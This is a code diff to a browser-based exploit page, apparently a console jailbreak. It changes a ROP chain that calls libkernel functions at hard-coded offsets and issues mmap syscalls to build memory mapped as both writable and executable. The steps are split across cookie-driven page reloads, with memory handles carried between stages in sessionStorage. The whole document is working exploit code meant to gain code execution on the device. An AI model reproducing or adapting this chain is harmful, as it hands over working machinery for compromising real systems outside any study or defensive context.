@@ -19,8 +19,14 @@ function load() {
 	
 	var codeExecutionStage = getCookie("codeExecutionStage");
 	if(codeExecutionStage == "1") {
+		cleanSessionVars();
 		allocateSharedMemory();
 		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory...";
+		setTimeout(function() { document.cookie = "codeExecutionStage=1.1"; location.reload(); }, 10);
+	}
+	else if(codeExecutionStage == "1.1") {
+		allocateSharedMemory2();
+		document.getElementById("codeExecutionStage").innerHTML = "Stage: Mapping shared memory 2...";
 		setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 10);
 	}
 	else if(codeExecutionStage == "2") {
@@ -42,26 +48,50 @@ function load() {
 
 var SECTIONSIZE = 1024 * 1024;
 
+function cleanSessionVars() {
+	sessionStorage.executableHandle = null;
+	sessionStorage.writableHandle = null;
+}
+
 function allocateSharedMemory() {
 	chain.call("createSharedMemory", LIBKERNEL, 0x15170, 0, SECTIONSIZE, 1 | 2 | 4, chain.data);
-	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x151c0, 0x52, 1 | 2, chain.data + 8);
+	chain.execute(function() {
+		var executableHandle = getU64from(chain.data);
+		logAdd("0x" + executableHandle.toString(16)); // 0x52
+
+		sessionStorage.executableHandle = JSON.stringify(executableHandle);
+		
+		logAdd("<h1>Refresh page and run Stage 1.1</h1>");
+	});
+}
+
+function allocateSharedMemory2() {
+	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
+
+	chain.call("createSharedMemoryAlias", LIBKERNEL, 0x151c0, executableHandle, 1 | 2, chain.data);
 	chain.syscall("mmap", 477, 0x926300000, SECTIONSIZE * 2, 1 | 2, 4096, -1, 0);
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
 		var dataAddress = chain.getVariable(0);
-		
-		logAdd("0x" + getU64from(chain.data).toString(16)); // 0x52
-		logAdd("0x" + getU64from(chain.data + 8).toString(16)); // 0x53
+		var writableHandle = getU64from(chain.data);
+
+		logAdd("0x" + executableHandle.toString(16)); // 0x52		
+		logAdd("0x" + writableHandle.toString(16)); // 0x53
 		logAdd("Data address: 0x" + dataAddress.toString(16)); // 0x926300000
+
+		sessionStorage.writableHandle = JSON.stringify(writableHandle);
 		
 		logAdd("<h1>Refresh page and run Stage 2</h1>");
 	});
 }
 
 function mapSharedMemory() {
-	chain.call("mapSharedMemory", LIBKERNEL, 0x15210, 0x53, 1 | 2, chain.data);
-	chain.syscall("mmap", 477, 0x926100000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, 0x52, 0);
+	var executableHandle = JSON.parse(sessionStorage.executableHandle || "{}");
+	var writableHandle = JSON.parse(sessionStorage.writableHandle || "{}");
+
+	chain.call("mapSharedMemory", LIBKERNEL, 0x15210, writableHandle, 1 | 2, chain.data);
+	chain.syscall("mmap", 477, 0x926100000 + SECTIONSIZE, SECTIONSIZE, 1 | 4, 1, executableHandle, 0);
 	chain.write_rax_ToVariable(0);
 	
 	chain.execute(function() {
@@ -523,7 +553,7 @@ function socketSend() {
 					<h3 id="codeExecutionStage">Stage: [Not started]</h3>
 					
 					<div>
-						<button onclick='allocateSharedMemory(); setTimeout(function() { document.cookie = "codeExecutionStage=2"; location.reload(); }, 1000);'>Go</button>
+						<button onclick='setTimeout(function() { document.cookie = "codeExecutionStage=1"; location.reload(); }, 10);'>Go</button>
 					</div>
 				</div>
 			</div>
